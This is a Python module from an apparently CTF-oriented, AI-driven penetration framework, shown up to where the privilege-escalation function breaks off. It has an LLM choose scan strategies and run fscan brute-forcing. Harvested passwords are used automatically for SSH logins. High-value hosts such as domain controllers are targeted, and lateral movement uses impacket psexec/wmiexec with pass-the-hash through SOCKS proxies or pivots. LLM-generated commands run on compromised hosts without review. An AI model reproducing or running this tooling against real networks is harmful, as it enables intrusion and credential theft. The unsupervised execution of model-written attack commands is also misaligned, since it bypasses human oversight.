# internal_network/nodes.py
"""
内网渗透节点实现

节点:
- internal_recon_node: 内网侦察节点 (支持代理)
- lateral_move_node: 横向移动节点
- privilege_escalation_node: 权限提升节点 (新增)

设计原则:
- 独立于Web CTF架构
- 复用现有工具系统
- 不修改核心状态结构
- AI驱动决策贯穿全程
- 集成阶段感知和战略上下文
"""
import json
import time
import os
import ipaddress
from typing import Dict, List, Any, Optional
from llm_client import llm_client
from config import config
from tool_framework import ToolRegistry
from logger import get_logger

# 导入提示词模块（集成阶段感知）
try:
    from internal_network.prompts import (
        get_internal_recon_prompt,
        get_credential_analysis_prompt,
        get_lateral_move_prompt,
        get_ad_analysis_prompt,
        get_privilege_escalation_prompt,
        get_flag_search_prompt,
        get_persistence_prompt,
        _build_stage_section,
        _build_strategic_section
    )
    PROMPTS_AVAILABLE = True
except ImportError:
    PROMPTS_AVAILABLE = False

# 导入战略规划器（集成智能决策）
try:
    from internal_network.strategic_planner import StrategicPlanner, get_strategic_planner
    STRATEGIC_PLANNER_AVAILABLE = True
except ImportError:
    STRATEGIC_PLANNER_AVAILABLE = False

# 错误纠正模块导入
try:
    from self_correction import self_correction_manager, ErrorSeverity, ErrorType
except ImportError:
    self_correction_manager = None
    ErrorSeverity = None
    ErrorType = None

# 模块日志器
logger = get_logger("InternalNetwork")

# 导入远程执行模块
try:
    from remote_executor.executors import ProxyExecutor, execute_on_session
    from remote_executor.session_manager import get_session_manager
    REMOTE_EXEC_AVAILABLE = True
except ImportError:
    logger.warning("remote_executor module not available")
    REMOTE_EXEC_AVAILABLE = False

# 导入高级操作模块
try:
    from internal_network.advanced_operations import (
        PrivilegeEscalation,
        RemoteDesktopHandler,
        FileTransferHandler,
        CredentialDumper,
        IntelligentPathSelector,
        PersistenceHandler,
        OperationStatus
    )
    ADVANCED_OPS_AVAILABLE = True
except ImportError:
    logger.warning("Advanced operations module not available")
    ADVANCED_OPS_AVAILABLE = False

# 导入凭据管理器
try:
    from internal_network.credential_manager import (
        get_credential_manager,
        CredentialType,
        PrivilegeLevel,
        Credential
    )
    CREDENTIAL_MANAGER_AVAILABLE = True
except ImportError:
    logger.warning("Credential manager module not available")
    CREDENTIAL_MANAGER_AVAILABLE = False

# 导入凭据集成模块
try:
    from internal_network.credential_integration import (
        store_credentials_to_manager,
        get_credentials_for_lateral,
        credential_to_dict,
        normalize_credential,
        parse_secretsdump_output,
        parse_mimikatz_output,
        CREDENTIAL_MANAGER_AVAILABLE as INTEGRATION_AVAILABLE
    )
    CREDENTIAL_INTEGRATION_AVAILABLE = True
except ImportError:
    logger.warning("Credential integration module not available")
    CREDENTIAL_INTEGRATION_AVAILABLE = False


def internal_recon_node(state: Dict) -> Dict:
    """
    [内网侦察节点] AI驱动 + SOCKS5代理支持

    输入:
        - internal_network_range: 内网网段
        - pivot_host: 跳板机
        - proxy_info: 代理信息 (SOCKS5)

    输出:
        - internal_hosts: 发现的主机列表
        - update CTFState

    工作流程:
        1. AI决策扫描策略
        2. 配置SOCKS5代理 (如果可用)
        3. 使用fscan扫描目标
        4. 解析结果并AI分析
    """
    network_range = state.get("internal_network_range", "")
    pivot_host = state.get("pivot_host", "")
    current_url = state.get("current_url", "")
    proxy_info = state.get("proxy_info", {})
    shell_session = state.get("shell_session", {})

    # 从当前URL提取目标IP
    target_ip = ""
    if not network_range:
        import re
        if current_url:
            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', current_url)
            if ip_match:
                target_ip = ip_match.group(1)
                network_range = target_ip

    if not network_range:
        return {
            "error": "无法确定扫描目标",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # AI决策扫描策略
    scan_strategy = _ai_decide_scan_strategy(state, network_range)
    logger.info(f"AI决策: {scan_strategy.get('strategy', 'quick')}")

    # 检查是否需要通过SOCKS5代理扫描
    use_proxy = False
    proxy_executor = None

    if proxy_info and proxy_info.get("socks5_address"):
        socks_addr = proxy_info.get("socks5_address", "")
        socks_port = proxy_info.get("socks5_port", 10800)

        if socks_addr:
            logger.info(f"通过SOCKS5代理扫描: {socks_addr}:{socks_port}")
            use_proxy = True

            if REMOTE_EXEC_AVAILABLE:
                proxy_executor = ProxyExecutor(
                    proxy_host=socks_addr,
                    proxy_port=socks_port,
                    proxy_type="socks5"
                )

    # 执行扫描
    try:
        # 方式1: 通过跳板机上的工具扫描 (推荐)
        session_id = shell_session.get("session_id", "")
        if session_id and REMOTE_EXEC_AVAILABLE:
            logger.info(f"通过跳板机扫描...")
            result = _scan_via_pivot(state, network_range, scan_strategy)

        # 方式2: 通过本地SOCKS5代理扫描
        elif use_proxy and proxy_executor:
            logger.info(f"通过本地代理扫描...")
            result = _scan_via_proxy(proxy_executor, network_range, scan_strategy)

        # 方式3: 直接本地扫描 (外网可达)
        else:
            logger.info(f"本地直接扫描: {network_range}")
            result = _scan_local(network_range, scan_strategy)

        # 处理扫描结果
        if result.get("success"):
            hosts = result.get("hosts", [])
            discovered_credentials = result.get("credentials", [])

            if hosts:
                logger.info(f"发现 {len(hosts)} 台主机")

                # AI分析发现
                analysis = _analyze_internal_hosts(hosts, state)

                # AI选择下一个目标
                first_target = _ai_select_next_target(hosts, state)

                # AI决策：是否用发现的凭据建立SSH连接
                ssh_updates = _ai_try_connect_with_credentials(state, discovered_credentials)

                return {
                    "internal_hosts": hosts,
                    "internal_mode": True,
                    "current_internal_target": first_target,
                    # analyst_intel已移除，关键信息合并到hosts[0].context
                    "scan_strategy": scan_strategy,
                    "execution_steps": state.get("execution_steps", 0) + 1,
                    **ssh_updates  # 合并SSH连接结果
                }

        # 无结果
        return {
            "error": result.get("error", "未发现存活主机或端口"),
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    except Exception as e:
        logger.warning(f"扫描异常: {e}")
        # 记录扫描错误
        if self_correction_manager:
            self_correction_manager.record_error(
                error_type=ErrorType.INTERNAL_SCAN_ERROR if ErrorType else "internal_scan_error",
                message=f"内网扫描失败: {str(e)}",
                severity=ErrorSeverity.HIGH if ErrorSeverity else "high",
                context={
                    "node": "internal_recon_node",
                    "target": network_range,
                    "scan_strategy": scan_strategy.get("strategy", "quick")
                }
            )
        return {
            "error": f"扫描异常: {str(e)}",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }


def _ai_decide_scan_strategy(state: Dict, network_range: str) -> Dict:
    """
    AI决策扫描策略

    根据目标环境、时间限制、资源情况决定最优扫描方式
    集成阶段感知和战略上下文
    """
    internal_hosts = state.get("internal_hosts") or []
    credentials = state.get("credentials") or []
    execution_steps = state.get("execution_steps", 0)

    # 获取阶段信息和战略上下文
    stage_info = state.get("stage_info", {})
    strategic_context = state.get("strategic_context", {})

    # 构建阶段感知部分
    stage_section = _build_stage_section(stage_info) if PROMPTS_AVAILABLE else ""
    strategic_section = _build_strategic_section(strategic_context) if PROMPTS_AVAILABLE else ""

    prompt = f"""
分析内网环境，决策最优扫描策略。
{stage_section}{strategic_section}
## 环境
- 目标网段: {network_range}
- 已发现主机: {len(internal_hosts)} 台
- 已获取凭据: {len(credentials)} 组
- 执行步数: {execution_steps}

## 扫描选项
- quick: 快速扫描 (常用端口，速度快)
- full: 全端口扫描 (慢但全面)
- vuln: 漏洞扫描 (带漏洞探测)
- brute: 暴力破解 (尝试常见弱口令)

## 要求
1. 选择最合适的扫描策略
2. 给出扫描参数建议
3. 考虑时间和隐蔽性

## 输出格式 (JSON)
{{
    "strategy": "quick/full/vuln/brute",
    "ports": "端口列表或范围",
    "timeout": 超时建议,
    "reasoning": "选择理由"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        strategy = json.loads(response.strip())
        return strategy

    except Exception as e:
        logger.warning(f"AI决策失败: {e}")
        return {"strategy": "quick", "ports": "1-1000", "timeout": 300}


def _scan_via_pivot(state: Dict, network_range: str, strategy: Dict) -> Dict:
    """
    通过跳板机扫描内网

    在跳板机上执行fscan等工具
    """
    shell_session = state.get("shell_session", {})
    session_id = shell_session.get("session_id", "")
    os_type = shell_session.get("os_type", "linux")

    if not session_id or not REMOTE_EXEC_AVAILABLE:
        return {"success": False, "error": "无可用的跳板机会话"}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"success": False, "error": "会话不存在"}

    # 检查会话健康状态
    health = session_manager.check_session_health(session_id)
    if not health.get("alive"):
        return {"success": False, "error": f"会话已断开: {health.get('status')}"}

    # 确定工具路径
    if os_type == "windows":
        tool_path = "C:\\temp\\fscan.exe"
    else:
        tool_path = "/tmp/fscan"

    # 构建扫描命令
    ports = strategy.get("ports", "1-1000")
    scan_type = strategy.get("strategy", "quick")

    # AI生成扫描命令
    prompt = f"""
生成fscan扫描命令。

## 参数
- 工具路径: {tool_path}
- 目标网段: {network_range}
- 端口: {ports}
- 扫描类型: {scan_type}
- 操作系统: {os_type}

## 要求
输出完整的扫描命令，只输出命令，不要解释。
"""

    try:
        cmd = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        logger.info(f"执行: {cmd}")

        result = execute_on_session(session, cmd, timeout=strategy.get("timeout", 300))

        if result.success:
            # 解析fscan输出
            parsed = _parse_fscan_output(result.output)
            return {
                "success": True,
                "hosts": parsed.get("hosts", []),
                "credentials": parsed.get("credentials", [])
            }
        else:
            return {"success": False, "error": result.error}

    except Exception as e:
        return {"success": False, "error": str(e)}


def _scan_via_proxy(proxy_executor, network_range: str, strategy: Dict) -> Dict:
    """
    通过SOCKS5代理扫描

    使用proxychains执行本地fscan
    """
    # fscan命令
    ports = strategy.get("ports", "1-1000")
    cmd = f"fscan -h {network_range} -p {ports} -o /tmp/fscan_result.txt"

    try:
        result = proxy_executor.execute_via_proxychains(cmd, timeout=strategy.get("timeout", 300))

        if result.success:
            parsed = _parse_fscan_output(result.output)
            return {
                "success": True,
                "hosts": parsed.get("hosts", []),
                "credentials": parsed.get("credentials", [])
            }
        else:
            return {"success": False, "error": result.error}

    except Exception as e:
        return {"success": False, "error": str(e)}


def _scan_local(network_range: str, strategy: Dict) -> Dict:
    """
    本地直接扫描 (外网可达场景)
    """
    ports = strategy.get("ports", "1-1000")

    try:
        fscan_result = ToolRegistry.execute_cached(
            "fscan",
            network_range,
            {
                "scan_type": strategy.get("strategy", "quick"),
                "brute": strategy.get("strategy") == "brute",
                "no_ping": True
            }
        )

        if not fscan_result:
            return {"success": False, "error": "扫描返回空结果"}

        # execute_cached 总是返回 {"cached": ..., "result": ...} 格式
        result = fscan_result.get("result", {})

        if result.get("success"):
            hosts_data = result.get("hosts", [])

            hosts = []
            for host_data in hosts_data:
                if not isinstance(host_data, dict):
                    continue

                host_info = {
                    "ip": host_data.get("ip", ""),
                    "hostname": "",
                    "os": "",
                    "ports": []
                }

                for port in host_data.get("ports", []):
                    if port.get("state") == "open" or port.get("port"):
                        host_info["ports"].append({
                            "port": port.get("port"),
                            "protocol": "tcp",
                            "service": port.get("service", ""),
                            "version": ""
                        })

                if host_info["ports"] and host_info["ip"]:
                    hosts.append(host_info)

            return {"success": True, "hosts": hosts}

        return {"success": False, "error": result.get("error", "扫描无结果")}

    except Exception as e:
        return {"success": False, "error": str(e)}


def _parse_fscan_output(output: str) -> Dict:
    """
    AI解析fscan输出

    让AI分析输出，提取:
    1. 开放端口
    2. 暴力破解成功的凭据

    返回格式: {"hosts": [...], "credentials": [...]}
    """
    if not output or len(output) < 10:
        return {"hosts": [], "credentials": []}

    prompt = f"""分析fscan扫描输出，提取关键信息。

## 输出内容
{output}

## 要求
提取以下信息:
1. 发现的开放端口 (IP:端口)
2. 暴力破解成功的凭据 (如果有)

## 输出格式 (JSON)
{{
    "hosts": [
        {{"ip": "IP地址", "ports": [端口号列表]}}
    ],
    "credentials": [
        {{"service": "ssh/smb/mysql等", "ip": "IP", "port": 端口, "username": "用户名", "password": "密码"}}
    ]
}}

只输出JSON，不要解释。"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        result = json.loads(response.strip())

        # 转换为主机格式
        hosts = []
        for h in result.get("hosts", []):
            ip = h.get("ip", "")
            if not ip:
                continue
            try:
                ipaddress.ip_address(ip)  # 验证IP
                hosts.append({
                    "ip": ip,
                    "hostname": "",
                    "os": "",
                    "ports": [{"port": p, "protocol": "tcp", "service": "", "version": ""} for p in h.get("ports", [])]
                })
            except ValueError:
                continue

        credentials = result.get("credentials", [])

        # 自动存储凭据到CredentialManager
        if CREDENTIAL_INTEGRATION_AVAILABLE:
            store_credentials_to_manager(credentials, source="fscan")

        return {"hosts": hosts, "credentials": credentials}

    except Exception as e:
        logger.warning(f"AI解析fscan输出失败: {e}")
        # 降级：简单正则提取IP:端口
        hosts = {}
        for line in output.split('\n'):
            match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
            if match:
                ip, port = match.group(1), int(match.group(2))
                if ip not in hosts:
                    hosts[ip] = {"ip": ip, "hostname": "", "os": "", "ports": []}
                hosts[ip]["ports"].append({"port": port, "protocol": "tcp", "service": "", "version": ""})
        return {"hosts": list(hosts.values()), "credentials": []}


def _ai_try_connect_with_credentials(state: Dict, discovered_credentials: List[Dict] = None) -> Dict:
    """
    AI决策是否用发现的凭据建立连接

    Args:
        state: 当前状态
        discovered_credentials: 扫描发现的凭据列表
    """
    credentials = discovered_credentials or []
    if not credentials:
        return {}

    prompt = f"""分析发现的凭据，决定连接策略。

## 凭据列表
{json.dumps(credentials, ensure_ascii=False, indent=2)}

## 已有会话
{json.dumps([s.get("host") for s in state.get("active_sessions", [])], ensure_ascii=False)}

## 要求
1. 选择最有价值的凭据尝试连接
2. 优先SSH (可交互)
3. 避免重复连接

## 输出格式 (JSON)
{{
    "should_connect": true/false,
    "reason": "理由",
    "selected": {{"service": "", "ip": "", "port": 22, "username": "", "password": ""}}
}}"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )
        decision = json.loads(response.strip())

        if not decision.get("should_connect"):
            return {}

        selected = decision.get("selected", {})
        if selected.get("service") != "ssh":
            return {}

        # 尝试SSH连接
        ip = selected.get("ip")
        port = selected.get("port", 22)
        username = selected.get("username")
        password = selected.get("password")

        if not all([ip, username, password]):
            return {}

        logger.info(f"[AI决策] 尝试SSH连接: {username}@{ip}:{port}")

        from remote_executor.session_manager import get_session_manager
        sm = get_session_manager()
        session = sm.create_ssh_session(host=ip, username=username, password=password, port=port)

        if session:
            logger.info(f"[SSH] 连接成功: {username}@{ip}:{port}")
            # 从session_manager获取最新状态，确保同步
            fresh_session = sm.get_session(session.id)
            session_dict = fresh_session.to_dict() if fresh_session else session.to_dict()
            return {
                "credentials": state.get("credentials", []) + [{
                    "username": username, "password": password, "host": ip, "port": port, "service": "ssh"
                }],
                "active_sessions": state.get("active_sessions", []) + [session_dict],
                "shell_session": session_dict if not state.get("shell_session") else state.get("shell_session")
            }

    except Exception as e:
        logger.warning(f"AI连接决策失败: {e}")

    return {}


def _ai_select_next_target(hosts: List[Dict], state: Dict) -> str:
    """
    AI选择下一个攻击目标

    综合考虑:
    - 高价值目标 (域控、数据库)
    - 已攻陷主机
    - 失败主机（排除）
    - 攻击成本
    - 阶段信息和战略上下文
    """
    active_sessions = state.get("active_sessions") or []
    compromised = [s.get("host") for s in active_sessions if s.get("host")]
    failed_hosts = state.get("failed_lateral_hosts") or []

    # 排除已攻陷和失败的主机
    excluded_hosts = set(compromised + failed_hosts)

    # 获取阶段信息和战略上下文
    stage_info = state.get("stage_info", {})
    strategic_context = state.get("strategic_context", {})
    stage_section = _build_stage_section(stage_info) if PROMPTS_AVAILABLE else ""
    strategic_section = _build_strategic_section(strategic_context) if PROMPTS_AVAILABLE else ""

    prompt = f"""
选择下一个攻击目标。
{stage_section}{strategic_section}
## 已发现主机
{json.dumps(hosts[:15], ensure_ascii=False, indent=2)}

## 已攻陷主机
{compromised}

## 已失败主机（必须排除）
{failed_hosts}

## 要求
1. 选择高价值目标
2. 避免已攻陷的主机
3. **必须排除已失败的主机**
4. 考虑攻击可行性

## 输出格式 (JSON)
{{
    "target": "目标IP",
    "reason": "选择理由",
    "attack_method": "推荐攻击方法"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())
        logger.info(f"AI选择目标: {result.get('target')} - {result.get('reason')}")
        return result.get("target", "")

    except Exception:
        # 降级: 选择高价值目标
        return _select_high_value_target(hosts)


def _select_high_value_target(hosts: List[Dict], excluded_hosts: set = None) -> str:
    """
    选择高价值目标 (降级方案)

    Args:
        hosts: 主机列表
        excluded_hosts: 需要排除的主机IP集合
    """
    excluded_hosts = excluded_hosts or set()

    for host in hosts:
        ip = host.get("ip", "")
        if not ip or ip in excluded_hosts:
            continue

        ports = [p.get("port") for p in host.get("ports", []) if p.get("port")]
        # 域控制器
        if any(p in ports for p in [88, 389, 636, 3268]):
            return ip
        # 数据库
        if any(p in ports for p in [1433, 3306, 5432]):
            return ip
        # 文件服务器
        if 445 in ports:
            return ip

    # 返回第一个未排除的主机
    for host in hosts:
        ip = host.get("ip", "")
        if ip and ip not in excluded_hosts:
            return ip

    return ""


def _analyze_internal_hosts(hosts: List[Dict], state: Dict = None) -> str:
    """
    AI分析内网主机发现 - 压缩上下文避免爆炸
    """
    if not hosts:
        return "未发现内网主机"

    # 压缩主机信息为摘要格式
    summary_lines = []
    for host in hosts[:10]:  # 只分析前10个
        ports = host.get("ports") or []
        ports_str = ", ".join([f"{p.get('port', '?')}" for p in ports[:5] if isinstance(p, dict)])
        summary_lines.append(f"{host.get('ip', '?')}: [{ports_str}]")

    summary = "\n".join(summary_lines)

    # 统计信息 (压缩上下文)
    stats = {
        "total_hosts": len(hosts),
        "total_ports": sum(len(h.get("ports", [])) for h in hosts),
        "has_dc": any(any(p.get("port") in [88, 389, 636, 3268] for p in h.get("ports", [])) for h in hosts),
        "has_db": any(any(p.get("port") in [1433, 3306, 5432] for p in h.get("ports", [])) for h in hosts),
    }

    prompt = f"""
分析内网扫描结果，识别高价值目标。

## 统计
- 主机数: {stats['total_hosts']}
- 端口数: {stats['total_ports']}
- 发现域控: {stats['has_dc']}
- 发现数据库: {stats['has_db']}

## 主机摘要
{summary}

## 要求
输出一行分析结论，包括:
1. 高价值目标
2. 推荐攻击方法
"""

    try:
        analysis = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        return analysis

    except Exception:
        return f"发现 {len(hosts)} 台主机，建议优先测试开放445/3389端口的主机"


def lateral_move_node(state: Dict) -> Dict:
    """
    [横向移动节点] AI驱动的横向移动

    输入:
        - current_internal_target: 当前目标
        - credentials: 已获取的凭据
        - internal_hosts: 已发现的主机
        - proxy_info: 代理信息

    输出:
        - active_sessions: 新会话
        - lateral_movement_paths: 移动路径

    AI决策:
        1. 选择最优目标
        2. 选择最佳攻击方法
        3. 选择合适的凭据
        4. 通过代理执行
    """
    # 安全获取列表，处理None值
    target = state.get("current_internal_target", "")
    credentials = state.get("credentials") or []
    internal_hosts = state.get("internal_hosts") or []
    active_sessions = state.get("active_sessions") or []
    proxy_info = state.get("proxy_info", {})
    shell_session = state.get("shell_session", {})
    failed_hosts = state.get("failed_lateral_hosts") or []

    if not target:
        # AI选择下一个目标（排除失败主机）
        target = _ai_select_next_target(
            internal_hosts,
            {"failed_lateral_hosts": failed_hosts, "active_sessions": active_sessions}
        )

    if not target:
        return {
            "error": "没有可用的横向移动目标",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    # 优先从CredentialManager获取凭据
    if CREDENTIAL_INTEGRATION_AVAILABLE and not credentials:
        credentials = get_credentials_for_lateral(state, target)
        if credentials:
            logger.info(f"[CredentialManager] 获取到 {len(credentials)} 条凭据用于横向移动")

    if not credentials:
        return {
            "error": "没有可用凭据",
            "current_internal_target": target,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # 获取目标主机信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        {}
    )
    ports = target_host.get("ports") or []

    # AI决策横向移动策略
    move_strategy = _ai_decide_lateral_strategy(target, target_host, credentials, state)

    logger.info(f"AI决策: {move_strategy.get('method')} -> {target}")

    # 执行横向移动
    result = None
    method = move_strategy.get("method", "psexec")
    cred = move_strategy.get("credential", credentials[0] if credentials else {})

    try:
        # 根据是否需要代理选择执行方式
        if proxy_info and REMOTE_EXEC_AVAILABLE:
            # 通过代理执行
            result = _execute_lateral_via_proxy(target, method, cred, proxy_info)
        elif shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
            # 通过跳板机执行
            result = _execute_lateral_via_pivot(target, method, cred, shell_session)
        else:
            # 本地直接执行
            if method in ["psexec", "wmiexec", "smbexec"]:
                result = ToolRegistry.execute_cached(
                    "impacket",
                    target,
                    {
                        "script": method,
                        "target": target,
                        "username": cred.get("username", ""),
                        "password": cred.get("password", ""),
                        "domain": cred.get("domain", ""),
                        "hash": cred.get("hash", ""),
                        "command": "whoami"
                    }
                )
            elif method == "ssh":
                result = ToolRegistry.execute_cached(
                    "hydra",
                    target,
                    {
                        "target": target,
                        "protocol": "ssh",
                        "username": cred.get("username", ""),
                        "password": cred.get("password", "")
                    }
                )

        # 处理结果
        if result and result.get("result", {}).get("success"):
            session = {
                "host": target,
                "session_type": method,
                "username": cred.get("username", ""),
                "shell_type": "shell"
            }

            move_path = {
                "source": state.get("pivot_host", ""),
                "target": target,
                "method": method,
                "credential_used": f"{cred.get('username')}@{cred.get('domain', 'WORKGROUP')}"
            }

            logger.info(f"成功获取 {target} 的shell")

            return {
                "active_sessions": [session],
                "lateral_movement_paths": [move_path],
                "pivot_host": target,
                "execution_steps": state.get("execution_steps", 0) + 1
            }

        error_msg = "横向移动失败"
        if result:
            if result.get("error"):
                error_msg = result["error"]
            elif result.get("result", {}).get("error"):
                error_msg = result["result"]["error"]

        logger.warning(f"失败: {error_msg}")

        # 记录失败主机，避免重复尝试
        new_failed_hosts = failed_hosts + [target]

        # 选择下一个目标（排除失败主机）
        next_target = _ai_select_next_target(
            internal_hosts,
            {"failed_lateral_hosts": new_failed_hosts, "active_sessions": active_sessions}
        )

        return {
            "error": error_msg,
            "failed_lateral_hosts": [target],
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0,
            "current_internal_target": next_target
        }

    except Exception as e:
        logger.warning(f"异常: {e}")
        return {
            "error": f"横向移动异常: {str(e)}",
            "failed_lateral_hosts": [target],
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }


def _ai_decide_lateral_strategy(
    target: str,
    target_host: Dict,
    credentials: List[Dict],
    state: Dict
) -> Dict:
    """
    AI决策横向移动策略

    分析:
    - 目标系统类型和开放端口
    - 可用凭据
    - 代理状态
    - 攻击成本
    - 阶段信息和战略上下文
    """
    ports = target_host.get("ports") or []
    ports_str = ", ".join([str(p.get("port", "?")) for p in ports[:10]])

    # 压缩凭据信息
    creds_summary = []
    for c in credentials[:5]:
        domain = c.get("domain", "WORKGROUP")
        user = c.get("username", "?")
        has_pass = "yes" if c.get("password") else "no"
        has_hash = "yes" if c.get("hash") else "no"
        creds_summary.append(f"{user}@{domain} (pass:{has_pass}, hash:{has_hash})")

    # 获取阶段信息和战略上下文
    stage_info = state.get("stage_info", {})
    strategic_context = state.get("strategic_context", {})
    stage_section = _build_stage_section(stage_info) if PROMPTS_AVAILABLE else ""
    strategic_section = _build_strategic_section(strategic_context) if PROMPTS_AVAILABLE else ""

    prompt = f"""
分析目标，决策最佳横向移动策略。
{stage_section}{strategic_section}
## 目标信息
- IP: {target}
- 开放端口: {ports_str}

## 可用凭据
{chr(10).join(creds_summary) if creds_summary else '无'}

## 可用方法
- psexec: 需要SMB(445), 管理员权限
- wmiexec: 需要WMI(135), 管理员权限
- smbexec: 需要SMB(445), 较隐蔽
- ssh: 需要SSH(22), 普通用户即可
- evil-winrm: 需要WinRM(5985/5986), 管理员权限

## 输出格式 (JSON)
{{
    "method": "psexec/wmiexec/smbexec/ssh/evil-winrm",
    "credential_index": 0,
    "reason": "选择理由",
    "risk_level": "low/medium/high"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())

        # 获取选择的凭据
        cred_idx = result.get("credential_index", 0)
        if 0 <= cred_idx < len(credentials):
            result["credential"] = credentials[cred_idx]
        else:
            result["credential"] = credentials[0] if credentials else {}

        return result

    except Exception as e:
        logger.warning(f"AI决策失败: {e}")
        # 降级: 基于规则选择
        method = _select_lateral_method(ports)
        return {
            "method": method,
            "credential": credentials[0] if credentials else {},
            "reason": "降级规则选择"
        }


def _execute_lateral_via_proxy(target: str, method: str, cred: Dict, proxy_info: Dict) -> Dict:
    """通过代理执行横向移动"""
    if not REMOTE_EXEC_AVAILABLE:
        return {"error": "代理执行模块不可用"}

    socks_addr = proxy_info.get("socks5_address", "127.0.0.1")
    socks_port = proxy_info.get("socks5_port", 10800)

    proxy_exec = ProxyExecutor(
        proxy_host=socks_addr,
        proxy_port=socks_port,
        proxy_type="socks5"
    )

    # 构建impacket命令
    if method in ["psexec", "wmiexec", "smbexec"]:
        domain = cred.get("domain", "")
        username = cred.get("username", "")
        password = cred.get("password", "")
        hash_val = cred.get("hash", "")

        # 构建认证字符串
        if domain:
            auth = f"{domain}/{username}"
        else:
            auth = username

        if hash_val:
            cmd = f"impacket-{method} -hashes {hash_val} {auth}@{target}"
        else:
            cmd = f"impacket-{method} {auth}:{password}@{target}"

        result = proxy_exec.execute_via_proxychains(cmd, timeout=120)
        return {
            "result": {
                "success": result.success,
                "output": result.output,
                "error": result.error
            }
        }

    return {"error": f"不支持的代理方法: {method}"}


def _execute_lateral_via_pivot(target: str, method: str, cred: Dict, shell_session: Dict) -> Dict:
    """通过跳板机执行横向移动"""
    if not REMOTE_EXEC_AVAILABLE:
        return {"error": "远程执行模块不可用"}

    session_id = shell_session.get("session_id", "")
    if not session_id:
        return {"error": "无有效会话"}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"error": "会话不存在"}

    # 检查会话健康状态
    health = session_manager.check_session_health(session_id)
    if not health.get("alive"):
        return {"error": f"会话已断开: {health.get('status')}"}

    # AI生成横向移动命令
    prompt = f"""
生成横向移动命令。

## 目标
- IP: {target}
- 方法: {method}

## 凭据
- 用户: {cred.get('username', '')}
- 密码: {cred.get('password', '')}
- 哈希: {cred.get('hash', '')}
- 域: {cred.get('domain', '')}

## 要求
输出完整的命令，只输出命令。
"""

    try:
        cmd = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        result = execute_on_session(session, cmd, timeout=120)

        return {
            "result": {
                "success": result.success,
                "output": result.output,
                "error": result.error
            }
        }
    except Exception as e:
        return {"error": str(e)}


def _select_best_credential(
    credentials: List[Dict],
    target: str,
    internal_hosts: List[Dict]
) -> Dict:
    """
    智能选择最适合目标主机的凭据

    优先级:
    1. 与目标同域的凭据
    2. 管理员凭据
    3. 第一个可用凭据
    """
    # 获取目标主机的域信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        {}
    )
    target_domain = target_host.get("domain", "")

    # 优先选择同域凭据
    if target_domain:
        for cred in credentials:
            if isinstance(cred, dict) and cred.get("domain") == target_domain:
                return cred

    # 其次选择管理员凭据
    for cred in credentials:
        if isinstance(cred, dict):
            username = cred.get("username", "").lower()
            if username in ["administrator", "admin", "root"]:
                return cred

    # 返回第一个可用凭据
    return credentials[0] if credentials else {}


def _select_lateral_method(ports: List[Dict]) -> str:
    """根据端口选择横向移动方法"""
    port_numbers = [p.get("port") for p in ports]

    if 445 in port_numbers:  # SMB
        return "psexec"
    elif 135 in port_numbers or 5985 in port_numbers or 5986 in port_numbers:  # WinRM/WMI
        return "wmiexec"
    elif 22 in port_numbers:  # SSH
        return "ssh"
    elif 3389 in port_numbers:  # RDP
        return "rdp"
    else:
        return "psexec"  # 默认尝试psexec


def privilege_escalation_node(state: Dict) -> Dict:
    """
    [权限提升节点] AI驱动的权限提升 - 支持失败自动切换

    输入:
        - active_sessions: 活跃会话
        - current_internal_target: 当前目标
        - shell_session: Shell会话信息

    输出:
        - active_sessions: 更新后的会话（包含提权状态）
        - credentials: 新获取的凭据

    改进:
        1. 智能检测系统环境选择最优方法
        2. 失败后自动切换备选方法
        3. 全面覆盖Windows/Linux提权路径
    """
    active_sessions = state.get("active_sessions") or []
    credentials = state.get("credentials") or []
    shell_session = state.get("shell_session", {})

    if not active_sessions and not shell_session:
        return {
            "error": "没有活跃会话可用于提权",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # 选择会话进行提权
    session = active_sessions[0] if active_sessions else shell_session
    target = session.get("host", "")
    os_type = session.get("os_type", shell_session.get("os_type", "linux"))
    is_admin = session.get("is_admin", False)

